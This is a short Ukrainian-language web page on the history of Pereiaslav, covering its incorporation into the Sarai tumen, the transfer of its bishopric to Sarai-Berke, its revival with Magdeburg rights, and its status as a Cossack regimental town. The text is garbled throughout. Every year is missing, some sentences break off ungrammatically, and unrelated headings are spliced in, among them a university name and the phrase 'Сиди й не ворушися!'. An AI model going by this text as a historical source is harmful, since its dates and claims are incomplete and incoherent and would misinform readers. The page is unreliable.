<p>Колишнє удільне переяславське князівство перестало існувати, а його землі разом зі столицею включили в нову адміністративну одиницю — Сарайську тьму.</p><strong><a id='d1'></a><h2>Переяслав-Хмельницький державний педагогічний університет імені Григорія Сковороди</h2></strong><p>Приблизно тоді ж кафедру переяславської єпархії перенесли до ставки хана в Сарай-Берке. Її очільником став призначений митрополитом Кирилом єпископ Феогност [11]. Відтоді місто, хоч і частково заселене, повністю занепадає. Відродження Переяслава формально розпочалось 6 березня  р. За цією грамотою князь мав право «вь томъ то Переяславлю замокъ збудовати». Відновлене місто отримало магдебурзьке право і власний герб, підтверджені потім грамотою Сигізмунда III в  р.</p><a id='d2'></a><h3>"Сиди й не ворушися!"</h3><p>Іншим листом під  р. Серед інших визначних моментів річпосполитської частини історії міста була фундація старостою Лукашем Жолкевським помер  р. Після створення Богданом Хмельницьким у повсталій проти поляків Україні полкового устрою влітку року Переяслав став центром округи — однойменного полку втім, як окрема одиниця Переяславський козацький полк існував ще з часів гетьмана Марка Жмайла.</p>
		
